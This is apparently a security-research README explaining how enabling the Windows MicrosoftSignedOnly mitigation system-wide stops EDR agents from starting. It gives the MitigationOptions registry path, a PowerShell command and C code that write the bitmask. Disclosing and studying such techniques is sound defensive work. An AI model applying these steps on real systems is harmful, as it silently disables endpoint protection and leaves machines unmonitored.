# Fairy-Law  


### **Fairy Law – Abusing `MicrosoftSignedOnly` to Impair EDR**


> **Full technical report available on the Orange Cyberdefense Blog.**  
> [(Link for the technical report)](https://www.orangecyberdefense.com/global/blog/cybersecurity/fairy-law)

<img width="700" height="700" alt="FairyLaw" src="https://github.com/user-attachments/assets/93613a97-e654-452c-b0e6-fd3a010ae46c" />


---

## Overview

Endpoint Detection & Response (EDR) solutions typically combine kernel-mode components with user-mode components such as monitoring modules, support libraries, and telemetry collectors. These user-mode components are often delivered as regular DLLs signed by the vendor or a third-party CA.

Windows provides a mitigation policy called `MicrosoftSignedOnly`, which enforces that a process may only load DLLs that are signed by Microsoft. When this policy is enabled system-wide, the operating system rejects all libraries that are not Microsoft-signed. This includes EDR components, even if they are properly signed by the vendor. As a result, many EDR agents cannot initialize and fail completely during startup after reboot.


---

## Why the Name “Fairy Law”

The technique name “Fairy Law” originates from the spell in the anime *Fairy Tail*. In the series, the spell affects only those the caster recognises as enemies and leaves allies unharmed.

This reflects how `MicrosoftSignedOnly` behaves. Windows treats Microsoft-signed binaries as trusted allies, while all other binaries, including legitimate vendor DLLs, are treated as hostile and are prevented from loading. 
The system itself decides what is allowed to run and rejects everything else instantly.


---

## Core Idea “Fairy Law”

The technique enables the `MicrosoftSignedOnly` policy globally by modifying:

```c
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Kernel\MitigationOptions
```

After reboot, Windows enforces the following rules:

- Only DLLs signed by Microsoft may be loaded
- Vendor-signed and third-party-signed DLLs cannot be loaded
- EDR agents depending on these DLLs fail to start
- User-mode telemetry, monitoring modules, and anti-tamper systems do not initialize
- The policy is applied once during kernel **Phase 0** and cannot be refreshed at runtime

This leads to complete operational failure of many EDR solutions.


---

## Technical Notes

`MitigationOptions` is evaluated once during kernel **Phase 0** before any user-mode process exists. Any change made later is ignored until the next reboot. Modifying this registry area requires administrator privileges followed by a restart.

Powershell example:
```powershell
Set-ProcessMitigation -System -Enable MicrosoftSignedOnly
```


In addition to the MicrosoftSignedOnly policy, there are several other policies that can be configured. 
A full list is available on the Microsoft’s documentation.


<img width="957" height="618" alt="image" src="https://github.com/user-attachments/assets/2257c1f2-f1a5-4bac-8183-b63cb1fa2563" />

---
## Configuring MitigationOptions via Windows-API


The same configuration can be applied programmatically by writing the corresponding 20-byte bitmask using `RegSetValueExA`.


Opening or creating the registry key
```c
 // Open or create the registry key
LONG result = RegCreateKeyExA(
            HKEY_LOCAL_MACHINE,              // root hive
            subkey,                          // subkey path
            0,
            NULL,                            // class type (unused)
            REG_OPTION_NON_VOLATILE,         // key persists after reboot
            KEY_WRITE | KEY_READ,            // access rights
            NULL,                            // security attributes
            &hKey,                           // returned key handle
            &disposition                     // tells if key was created or opened
        );

        if (result != ERROR_SUCCESS) {
            printf("Error opening/creating registry key: %ld\n", result);
            return 1;
        }

        if (disposition == REG_CREATED_NEW_KEY) {
            printf("Registry key was created.\n");
        }
        else {
            printf("Registry key already exists.\n");
        }

```


Writing the MitigationOptions value
```c
// The REG_BINARY value for MicrosoftSignedOnly
        BYTE mitigationValue[] = {
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x10, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        };

// Set or overwrite the REG_BINARY value
        result = RegSetValueExA(
            hKey,
            valueName,                       // value name
            0,
            REG_BINARY,                      // binary value
            mitigationValue,                 // data buffer
            sizeof(mitigationValue)          // size of the binary data
        );

        if (result != ERROR_SUCCESS) {
            printf("Error writing value: %ld\n", result);
            RegCloseKey(hKey);
            return 1;
        }

        printf("MitigationOptions successfully written.\n");

        RegCloseKey(hKey);

```
---
## Limitations for Attackers

While this mitigation unintentionally disables several security products, it also limits attackers by blocking:

- Custom DLL injection
- Reflective DLL loading

Attackers must rely instead on techniques that do not require DLL loading, such as in-memory shellcode, living-off-the-land binaries, or misuse of legitimate Microsoft-signed components.


---
## Additional Observation

Enforcing `MicrosoftSignedOnly` globally affects not only security products but also numerous legitimate applications. Many third-party programs depend on non-Microsoft-signed libraries and may therefore fail to start under this policy. While there are Windows mechanisms that allow fine-grained exceptions for specific executables, these do not change the fact that enabling the policy system-wide creates a highly unstable environment and can selectively disable security-critical components.

Powershell example:
<img width="1394" height="626" alt="PowershellScreen" src="https://github.com/user-attachments/assets/2bbd1a28-543a-44db-998d-95169b876a36" />


Firefox:
<img width="1232" height="184" alt="IFEO-Key" src="https://github.com/user-attachments/assets/00551464-e0b1-4898-bfef-c5597a5af3eb" />


<img width="640" height="400" alt="IFEO-Exclusion" src="https://github.com/user-attachments/assets/e3525b71-9abe-4810-85a0-956a547e87c6" />



---
## Conclusion

Enabling `MicrosoftSignedOnly` via `MitigationOptions` can cause many EDR products to become partially or completely non-functional. Their user-mode components cannot load because the operating system rejects all DLLs that are not Microsoft-signed, even when these libraries are correctly signed by the vendor. The result is a system that appears operational but is effectively unprotected and blind.

Although the mitigation also restricts certain attacker techniques, the loss of visibility and security monitoring for affected EDR products is significantly more severe.

----
